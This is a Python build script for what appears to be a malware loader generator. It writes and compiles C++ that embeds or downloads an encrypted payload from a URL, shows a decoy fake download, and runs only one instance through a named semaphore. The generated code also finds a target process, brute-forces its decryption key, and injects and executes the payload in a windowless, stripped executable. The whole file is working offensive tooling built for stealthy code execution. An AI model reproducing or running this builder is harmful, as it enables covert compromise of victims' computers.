import os
import time
from Cast.encryptor import *

def build (Path, build_folder, Encryption, Enumeration, Payload, ProcessName, Loader, Url, Decoy, Control_String):
    f = open (f"{build_folder}\\main.cpp", "a")
    f.write(f"""
#include <iostream>
#include <string>
#include <Windows.h>
#include <stdio.h>
#include <wininet.h>
#include "../../Spells/UtilitySpells/FetchFromURL.h"

""")
    if Decoy != "null":
        f.write(f"""\n
#include "../../Spells/UtilitySpells/FakeDownload.h"
""")   
    
    if Encryption != "null":
        f.write(f"""\n
#include "../../Spells/EncryptionSpells/{Encryption}"
#include "../../Spells/EncryptionSpells/KeyBrute.h"
""")
        
    if Enumeration != "null":
        f.write(f"""\n
#include "../../Spells/{Enumeration}"
""")
        
    f.write(f"""\n
#include "../../Spells/{Loader}"
""")
    if Payload != "null" :
        Payload_Str = "static const unsigned char Data_RawData[] = {" + ", ".join(map(lambda b: hex(b), Payload)) + "};"
        f.write(f"""\n
{Payload_Str} 
""")
        
    f.write(f"""\n
using namespace std;
int main()
{{
    PBYTE pPayloadAddress;
    SIZE_T pPayloadSize;
    string Url = "{Url}";
    LPWSTR szProcessName = L"{ProcessName}";
    DWORD dwProcessID;
    HANDLE hProcess;
    PBYTE InjectionAddress;
    HANDLE hThread;
    HANDLE* phThread = &hThread;

    """)
    if Decoy != "null":
        f.write(f"""\n
    FakeDownload();
""")

    f.write(f"""\n
    HANDLE hSemaphore = CreateSemaphoreA(NULL, 10, 10, "{Control_String}");

    if (hSemaphore != NULL && GetLastError() == ERROR_ALREADY_EXISTS)
	    exit(0);

	// Payload is not running
    hThread = GetCurrentThread();
    """)

    if Payload != "null":
        f.write(f"""\n
    pPayloadSize = {len(Payload)};
    pPayloadAddress = (PBYTE)malloc(pPayloadSize);
    if (pPayloadAddress == NULL)
    {{
        printf("Memory allocation failed.\\n");
        return 1;
    }}
    memcpy(pPayloadAddress, Data_RawData, pPayloadSize);
""")

    if Url != "null":
        f.write(f"""\n
    if(!FetchFileFromURLA(Url.c_str(), &pPayloadAddress, (PDWORD)&pPayloadSize)){{
        printf("Failed to fetch payload");
        return 0;
    }}

    """)

    if Enumeration != "null":
        f.write(f"""\n
    if(!GetRemoteProcess(szProcessName, &dwProcessID, &hProcess, &hThread)){{
        printf("Failed to find remote process");
        return 0;
    }}""" ) 
    else:
        pass

    if Encryption != "null":
        f.write(f"""\n
    {get_keyguard()[1]}
    
    #define HINT_BYTE {get_keyguard()[2]}
    size_t sKeySize = sizeof(ProtectedKey);
    PBYTE pbKey = (PBYTE)ProtectedKey;
    PBYTE pbRealKey;
    BruteForceDecryption(HINT_BYTE , pbKey, sKeySize, &pbRealKey);
    size_t sRealKeySize = sizeof(pbRealKey);
    Decrypt(pPayloadAddress, pPayloadSize, pbRealKey, sRealKeySize);

""")

    f.write(f"""\n
    if(!PayloadExecute(hProcess, hThread, pPayloadAddress, (SIZE_T)pPayloadSize, &InjectionAddress, phThread)){{
        printf("Failed to execute payload");
        return 0;
    }}
            
    free(pPayloadAddress);
   
    // Just for testing purposes (TO REMOVE)
	WaitForSingleObject(*phThread, INFINITE);
    return 0;
}}
""")

    f.close()
    time.sleep(2)
    #build = os.system(f"g++ --static -g -O2 -w -s -DNO_WINTERNL -o {Path} Build\\main.cpp Cast\\TinyAES.c -lwininet -lws2_32 -mwindows")
    build = os.system(f"g++ --static -g -O2 -w -s -DNO_WINTERNL -o {Path} {build_folder}\\main.cpp Cast\\TinyAES.c -lwininet -lws2_32 -mwindows")
    os.system(f"strip -o  {Path}.exe {Path}.exe")
    return build
    #result = subprocess.run(['g++', '-o', 'chungus', 'main.cpp','-lwininet', '-DNO_WINTERNL', '-lws2_32', '-mwindows'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    #print(result)

